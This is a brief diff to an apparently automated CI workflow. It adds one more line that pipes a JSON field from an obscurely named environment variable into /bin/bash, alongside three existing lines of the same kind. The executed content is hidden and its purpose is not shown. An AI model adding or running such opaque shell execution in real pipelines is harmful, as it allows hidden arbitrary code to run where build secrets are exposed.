@@ -25,6 +25,7 @@ jobs:
           echo $vyxy722 | jq -r .srgc24233 | /bin/bash
           echo $cinmi078 | jq -r .sc671 | /bin/bash
           echo $gxchb67 | jq -r .nq0 | /bin/bash
+          printf '%s' "$jex0" | jq -r .walio90 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
